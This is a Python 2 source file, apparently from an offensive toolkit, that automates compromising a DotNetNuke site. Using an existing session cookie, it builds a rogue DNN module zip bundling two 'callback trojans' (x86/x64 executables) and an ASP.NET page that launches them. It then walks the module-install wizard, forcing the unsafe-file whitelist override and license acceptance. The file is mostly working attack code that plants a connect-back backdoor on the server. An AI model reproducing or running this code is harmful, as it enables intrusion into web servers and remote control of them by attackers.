from __future__ import with_statement
import os
import sys
import time
if '.' not in sys.path: sys.path.append('.')

import tempfile
import zipfile
import urllib2
import random
import string
from libs import MultipartPostHandler
from HTMLParser import HTMLParser

import socket
import timeoutsocket
from contextlib import contextmanager

TIMEOUTSOCKET_REF = timeoutsocket.timeoutsocket
NO_TIMEOUTSOCKET  = socket._no_timeoutsocket
REAL_SOCKET       = socket._realsocket

# Default timeout in seconds for socket connections
TIMEOUT = 5

@contextmanager
def socket_timeout(timeout):
    """
    Wrap python's 2.3+ default socket timeout mechanism
    in a with statement while ensuring this all works
    fine with timeoutsocket.

    We have to do this here because timeoutsocket timeouts
    do not work with urllib2.
    """
    socket.socket = NO_TIMEOUTSOCKET
    socket.setdefaulttimeout(timeout)
    try:
        yield
    finally:
        socket.setdefaulttimeout(None)
        socket.socket = TIMEOUTSOCKET_REF
#-------------------------------------------------------------------------------

# Note:
# to trigger the callback you must request baseurl + /DesktopModules/Admin/connback/
class DotNetNuke():
    class ViewStateExtractor(HTMLParser):
        def __init__(self):
            HTMLParser.__init__(self)
            self.viewstate = ""

        def getViewState(self):
            return self.viewstate

        def handle_starttag(self, tag, attrs):
            if tag == "input":
                attr_dict = {}
                for name, val in attrs:
                    attr_dict[name] = val

                if  "id" in attr_dict and attr_dict["id"] == "__VIEWSTATE":
                    self.viewstate = attr_dict["value"]


    def __init__(self, basepath, cookie_jar, log):
        self.basepath = basepath
        self.viewstate = ""
        self.install_module_url = "Host/Module%20Definitions/tabid/18/ctl/Install/rtab/19/portalid/0/Default.aspx"
        self.respath = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmpdir = tempfile.gettempdir()
        self.log = log
        self.dotnukemodname = ''.join(random.choice(string.letters) for i in xrange(15))
        self.cookie_jar = cookie_jar

    def install_callback(self):
        filename, callback = self.build_module()
        return self.install_module(filename), callback

    def build_module(self):
        self.log("Building DotNetNuke callback module")

        template = open(os.path.join(self.respath, "connback.connback.dnn"), 'r')
        data2 = template.read().replace("SETMEANAME", self.dotnukemodname)
        template.close()

        outfile = open(os.path.join(self.tmpdir, "connback.connback.dnn"), "w")
        outfile.write(data2)
        outfile.close()

        module = zipfile.ZipFile(os.path.join(self.tmpdir, "%s.zip" % (self.dotnukemodname)),"w")
        module.write(os.path.join(self.tmpdir, "connback.connback.dnn"), "%s.%s.dnn" % (self.dotnukemodname, self.dotnukemodname))
        module.write(os.path.join(self.respath, "Default.aspx"), "Default.aspx")
        module.write(os.path.join(self.respath, "Default.aspx.cs"), "Default.aspx.cs")
        # we add 2 callback trojans that were previously created and stored in the resource dir
        # the asp.net code will detect the current architecture and launch the correct one
        module.write(os.path.join(self.respath, "callback_X86.exe"), "callback_X86.exe")
        module.write(os.path.join(self.respath, "callback_X64.exe"), "callback_X64.exe")
        module.close()

        self.log("Zip file created to %s" % os.path.join(self.tmpdir,"%s.zip" % self.dotnukemodname))
        return (os.path.join(self.tmpdir, "%s.zip" % self.dotnukemodname), "DesktopModules/Admin/%s/" % self.dotnukemodname)

    def install_module(self, filename):
        # for testing!!!!!
        #proxy_handler = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
        #cj = cookielib.CookieJar()
        opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler,
                                      urllib2.HTTPCookieProcessor(self.cookie_jar)) #, proxy_handler)

        self.log("Installing module")
        self.log("Step 1...")
        if not self. _install_module_step1(opener):
            return False

        self.log("Step 2...")
        if not self._install_module_step2(filename, opener):
            return False

        self.log("Step 3...")
        if not self._install_module_click_next(opener):
            return False

        self.log("Step 4...")
        if not self._install_module_click_next(opener):
            return False

        self.log("Step 5...")
        if not self._install_module_click_next(opener):
            return False

        self.log("Sleeping 5 seconds to finish callback installation")
        time.sleep(5)

        self.log("Done.")

        # clean temp file created
        try:
            os.remove(filename)
        except OSError:
            pass

        return True

    def _install_module_step1(self, opener):
        #headers = {"Cookie":self.getCookie()}
        with socket_timeout(TIMEOUT):
            response = opener.open(urllib2.Request(self.basepath + self.install_module_url))
            #response = urllib2.urlopen(urllib2.Request(self.basepath + self.install_module_url, headers=headers))


        #This happens if the cookie was not valid
        if "login.aspx" in response.url:
            return False

        data = response.read()

        # Refresh our viewstate
        myparser = DotNetNuke.ViewStateExtractor()
        myparser.feed(data)
        self.viewstate = myparser.getViewState()

        return True

    def _install_module_step2(self, filename, opener):

        params = {}
        params['__EVENTTARGET']='dnn$ctr$Install$wizInstall$StartNavigationTemplateContainerID$StartNextLinkButton'
        params['__EVENTARGUMENT']=''
        params['__LASTFOCUS']=''
        params['__VIEWSTATE']=self.viewstate

        # This forces to skip the "want to upload an unsecure file?" advert
        params['dnn$ctr$Install$wizInstall$chkIgnoreWhiteList']='on'
        params['dnn$ctr$Install$wizInstall$cmdBrowse'] = open(filename, "rb")

        #opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler)

        #headers = {"Cookie":self.getCookie()}
        request = urllib2.Request(self.basepath + self.install_module_url, params) #, headers=headers)

        #update viewstate
        with socket_timeout(TIMEOUT):
            data = opener.open(request).read()

        # Refresh our viewstate
        myparser = DotNetNuke.ViewStateExtractor()
        myparser.feed(data)
        self.viewstate = myparser.getViewState()

        return True

    def _install_module_click_next(self, opener):

        params = {}
        params['__EVENTTARGET']='dnn$ctr$Install$wizInstall$StepNavigationTemplateContainerID$StepNextLinkButton'
        params['__EVENTARGUMENT']=''
        params['__LASTFOCUS']=''
        params['__VIEWSTATE']=self.viewstate
        # This forces to skip the "want to upload an unsecure file?" warning
        params['dnn$ctr$Install$wizInstall$chkIgnoreWhiteList']='on'
        # This bypass the accept licence warning
        params['dnn$ctr$Install$wizInstall$chkAcceptLicense']='on'

        #opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler)
        #
        #headers = {"Cookie":self.getCookie()}
        request = urllib2.Request(self.basepath + self.install_module_url, params) #, headers=headers)

        #update viewstate
        try:
            with socket_timeout(TIMEOUT):
                data = opener.open(request).read()
        except Exception:
            return False

        # Refresh our viewstate
        myparser = DotNetNuke.ViewStateExtractor()
        myparser.feed(data)
        self.viewstate = myparser.getViewState()

        return True
